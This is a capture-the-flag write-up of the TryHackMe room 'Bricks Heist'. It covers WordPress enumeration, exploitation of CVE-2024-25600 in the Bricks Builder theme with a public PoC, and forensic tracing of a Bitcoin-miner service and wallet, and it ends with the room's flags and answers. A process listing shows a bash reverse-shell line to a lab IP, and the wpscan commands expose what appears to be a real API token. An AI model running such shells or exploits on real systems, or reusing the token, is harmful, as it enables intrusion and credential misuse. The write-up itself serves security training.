
---
title: "TryHack3M: Bricks Heist"
summary: "Crack the code, command the exploit! Dive into the heart of the system with just an RCE CVE as your key."
categories: ["TryHackMe", "Web Exploitation", "Digital Forensics", "Blog"]
tags: ["TryHackMe", "Digital Forensics", "Web"]
date: 2025-10-02
draft: false

---

# **TryHack3M: Bricks Heist**

- **Name:** TryHack3M: Bricks Heist
- **Category:** Digital Forensics
- **Challenge Description:**  
    From Three Million Bricks to Three Million Transactions!
    
	Brick Press Media Co. was working on creating a brand-new web theme that represents a renowned wall using three million byte bricks. Agent Murphy comes with a streak of bad luck. And here we go again: the server is compromised, and they've lost access.
	
	Can you hack back the server and identify what happened there?

---
# Enumeration
We begin with a network scan to identify open ports and services.
## nmap
```sh
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 df:44:b7:47:ae:97:ce:c0:0e:e0:e2:1c:ff:8c:00:b4 (RSA)
|   256 e4:1b:ee:46:39:b6:e2:bc:45:3b:7c:18:06:6e:51:e9 (ECDSA)
|_  256 03:22:db:69:6f:75:1c:fa:51:4e:70:bf:8b:eb:5c:fd (ED25519)
80/tcp   open  http     WebSockify Python/3.8.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
|_http-generator: WordPress 6.5
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache
|_http-title: Brick by Brick
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
3306/tcp open  mysql    MySQL (unauthorized)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```
The HTTPS port hosts a **WordPress** site titled “Brick by Brick.”
## WordPress Enumeration with WPScan
Since we’re dealing with WordPress, `wpscan` is our go-to reconnaissance tool.
```sh
wpscan --url https://bricks.thm/ --api-token W6l5w2UsbxBiEJXOVk116QmbVHUXWwvTaniNBlyaelA

❯ wpscan | grep tls
❯ wpscan --help | grep tls
        --disable-tls-checks                      Disables SSL/TLS certificate verification, and downgrade to TLS1.0+ (requires cURL 7.66 for the latter)
❯ wpscan --url https://bricks.thm/ --api-token W6l5w2UsbxBiEJXOVk116QmbVHUXWwvTaniNBlyaelA --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://bricks.thm/ [10.10.238.133]
[+] Started: Mon Oct 20 16:54:23 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |
[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: Bricks < 1.9.6.1 - Unauthenticated Remote Code Execution
 |     Fixed in: 1.9.6.1

 | [!] Title: Bricks < 1.9.6.1 - Unauthenticated Remote Code Execution
 |     Fixed in: 1.9.6.1

 | [!] Title: Bricks < 1.10.2 - Authenticated (Bricks Page Builder Access+) Stored Cross-Site Scripting
 |     Fixed in: 1.10.2
 
 | [!] Title: Bricksbuilder < 1.9.7 - Authenticated (Contributor+) Privilege Escalation via create_autosave
 |     Fixed in: 1.9.7
 |
 | [!] Title: Bricks Builder < 2.0 - Unauthenticated SQL Injection via `p` Parameter
 |     Fixed in: 1.12.5
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'


```

### Key Findings:

WordPress Version: 6.5 (Insecure, multiple XSS & path traversal CVEs)

- XML-RPC: Enabled

- robots.txt: /wp-admin/ and /wp-admin/admin-ajax.php

- Theme: bricks (Bricks Builder)

- Theme Version: 1.9.5

- Critical Vulnerability: Bricks < 1.9.6.1 - Unauthenticated Remote Code Execution (CVE-2024-25600)

### References:

[CVE-2024-25600](https://www.cve.org/CVERecord?id=CVE-2024-25600)

This confirmed an unauthenticated RCE in the Bricks Builder theme.

## Exploitation – CVE-2024-25600

We’ll use a public PoC exploit for Bricks Builder RCE from GitHub:  
➡️ [K3ysTr0K3R/CVE-2024-25600-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)

```sh
python3 CVE-2024-25600.py -u https://bricks.thm
```

**Output:**

```less
[*] Checking if the target is vulnerable 
[+] The target is vulnerable 
[*] Initiating exploit against: https://bricks.thm 
[*] Interactive shell opened successfully
```

We now have an **interactive shell** as the Apache user.

---

## Web Directory Enumeration

Let’s list files to see what’s in the webroot.
```sh
> ls 650c844110baced87e1606453b93f22a.txt 
index.php 
phpmyadmin 
wp-config.php 
wp-content 
...
```
A strange `.txt` file stands out.
```sh
> cat 650c844110baced87e1606453b93f22a.txt 
THM{fl46_650c844110baced87e1606453b93f22a}
```

**Flag:** `THM{fl46_650c844110baced87e1606453b93f22a}`
## What is the name of the suspicious process?

lets see running processes using `ps aux`. 
```sh
ubuntu      2104  0.0  1.0 395180 40500 ?        Sl   08:00   0:00 plank
ubuntu      2139  0.0  0.9 354728 39260 ?        Sl   08:00   0:00 /usr/bin/python3 /usr/bin/blueman-tray
ubuntu      2148  0.0  0.7 413276 31472 ?        Sl   08:00   0:00 /usr/lib/mate-panel/notification-area-applet
ubuntu      2149  0.0  0.9 461948 37676 ?        Sl   08:00   0:00 /usr/lib/mate-panel/clock-applet
ubuntu      2157  0.0  0.0   3904  2812 ?        S    08:00   0:00 /bin/bash /usr/lib/x86_64-linux-gnu/bamf/bamfdaemon-dbus-runner
ubuntu      2158  0.0  0.7 414912 28608 ?        Sl   08:00   0:00 /usr/lib/x86_64-linux-gnu/bamf/bamfdaemon
ubuntu      2171  0.0  1.3 1099248 53648 ?       Sl   08:00   0:00 /usr/libexec/evolution-calendar-factory
ubuntu      2202  0.0  1.3 803928 55676 ?        Sl   08:00   0:00 /usr/libexec/evolution-addressbook-factory
ubuntu      2224  0.0  0.1 308244  7784 ?        Sl   08:00   0:00 /usr/libexec/gvfsd-trash --spawner :1.1 /org/gtk/gvfs/exec_spaw/0
ubuntu      2240  0.0  0.1 156696  5852 ?        Sl   08:00   0:00 /usr/libexec/gvfsd-metadata
ubuntu      2315  3.0  4.2 674788 168124 ?       SNl  08:00   0:14 /usr/bin/python3 /usr/bin/update-manager --no-update --no-focus-on-map
apache      2472  0.0  1.7 1661624 70764 ?       Sl   08:05   0:00 /usr/local/apache/bin/httpd -k start
root        2537  0.0  0.0      0     0 ?        I    08:06   0:00 [kworker/1:1-events]
apache      2552  0.0  0.0   2616   528 ?        S    08:08   0:00 sh -c cd '/data/www/default' ;  bash -c 'exec bash -i &>/dev/tcp/10.8.69.68/4444 <&1'
apache      2553  0.0  0.0   8968  3872 ?        S    08:08   0:00 bash -i
root        2555  0.7  0.0   2820   652 ?        Ss   08:08   0:00 /lib/NetworkManager/nm-inet-dialog
root        2556  1.5  0.6  34808 28012 ?        S    08:08   0:00 /lib/NetworkManager/nm-inet-dialog
apache      2560  0.0  0.0  10620  3280 ?        R    08:08   0:00 ps aux

```
Checking there is a process **`nm-inet-dialog`** which is running as `root`. This is a bit suspicious also it started later compared to other system processes that started at `08:00`.

## What is the service name affiliated with the suspicious process?
Check all running services using `systemctl --type=service --state=running`.
```sh
  systemd-networkd.service                       loaded active running Network Service                                                 
  systemd-resolved.service                       loaded active running Network Name Resolution                                         
  systemd-timesyncd.service                      loaded active running Network Time Synchronization                                    
  systemd-udevd.service                          loaded active running udev Kernel Device Manager                                      
  ubuntu.service                                 loaded active running TRYHACK3M                                                       
  udisks2.service                                loaded active running Disk Manager                                                    
  unattended-upgrades.service                    loaded active running Unattended Upgrades Shutdown                                    
  upower.service                                 loaded active running Daemon for power management                                     
  user@1000.service                              loaded active running User Manager for UID 1000                                       
  user@114.service                               loaded active running User Manager for UID 114                                        
  whoopsie.service                               loaded active running crash report submission daemon                                  
  wpa_supplicant.service                         loaded active running WPA supplicant                                                  
```
there is a process `TRYHACK3M` running by the service name `ubuntu.service`.

## What is the log file name of the miner instance?
Now that we know the service name, lets check more info and the location of this service
To check this we use the command 
```sh
apache@tryhackme:/data/www/default$ systemctl status ubuntu.service
systemctl status ubuntu.service
● ubuntu.service - TRYHACK3M
     Loaded: loaded (/etc/systemd/system/ubuntu.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2025-10-27 08:30:29 UTC; 2min 19s ago
   Main PID: 2626 (nm-inet-dialog)
      Tasks: 2 (limit: 4671)
     Memory: 30.6M
     CGroup: /system.slice/ubuntu.service
             ├─2626 /lib/NetworkManager/nm-inet-dialog
             └─2627 /lib/NetworkManager/nm-inet-dialog
```
the service runs at the location `/lib/NetworkManager`. Checking that directory, there is a configuration file `inet.conf`. Checking it show it shows logs of this service
```sh
apache@tryhackme:/lib/NetworkManager$ head inet.conf
head inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()

```

## What is the wallet address of the miner instance?

The log file shows an id which could be an address.
This value is a hex and decoding it results in a base64 encoded value which when decoded again shows a value.
```sh
❯ echo "5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d" | xxd -r -p
WW1NeGNYbHJOemxtWTNBNWFHUTFhM0psY0hKalpUZzVkR3RvTkhkeWRHdzRZWFowTkd3Mk4zRmhZbU14Y1hsck56bG1ZM0E1YUdGa05XdHlaWEJ5WTJVNE9YUnJhRFIzY25Sc09HRjJkRFJzTmpkeFlRPT0=%                ❯ echo "WW1NeGNYbHJOemxtWTNBNWFHUTFhM0psY0hKalpUZzVkR3RvTkhkeWRHdzRZWFowTkd3Mk4zRmhZbU14Y1hsck56bG1ZM0E1YUdGa05XdHlaWEJ5WTJVNE9YUnJhRFIzY25Sc09HRjJkRFJzTmpkeFlRPT0=" | base64 -d
YmMxcXlrNzlmY3A5aGQ1a3JlcHJjZTg5dGtoNHdydGw4YXZ0NGw2N3FhYmMxcXlrNzlmY3A5aGFkNWtyZXByY2U4OXRraDR3cnRsOGF2dDRsNjdxYQ==%                                                        ❯ echo "YmMxcXlrNzlmY3A5aGQ1a3JlcHJjZTg5dGtoNHdydGw4YXZ0NGw2N3FhYmMxcXlrNzlmY3A5aGFkNWtyZXByY2U4OXRraDR3cnRsOGF2dDRsNjdxYQ==" | base64 -d
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa%
```
checking on the final value `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa` show to values repeating
`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` and `bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa` the initial value `bc` shows it might be a bitcoin wallet address which it is

## The wallet address used has been involved in transactions between wallets belonging to which threat group?

now that we ave the wallet address `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`, lets research to find a threat group associated to it. A simple google search reveals a blockchain search.
Blockchain Explorer :([https://www.blockchain.com/explorer/search?search=bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa](https://www.blockchain.com/explorer/search?search=bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa))

[](#OFAC---United-States-Sanctions-Affiliates-of-Russia-Based-LockBit-Ransomware-Group "OFAC---United-States-Sanctions-Affiliates-of-Russia-Based-LockBit-Ransomware-Group")OFAC - United States Sanctions Affiliates of Russia-Based LockBit Ransomware Group

Information appeared about the individual associated with the account address, "Ivan Gennadievich," and at the top of the page,  
the group `LockBit` was mentioned.

## Summary of Findings

|Question|Answer|
|---|---|
|Hidden File Content|`THM{fl46_650c844110baced87e1606453b93f22a}`|
|Suspicious Process|`/lib/NetworkManager/nm-inet-dialog`|
|Malicious Service|`ubuntu.service`|
|Miner Log File|`/lib/NetworkManager/inet.conf`|
|Wallet Address|`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`|
|Threat Group|**LockBit Ransomware Group**|
|Vulnerability|**CVE-2024-25600 (Bricks Builder RCE)**|
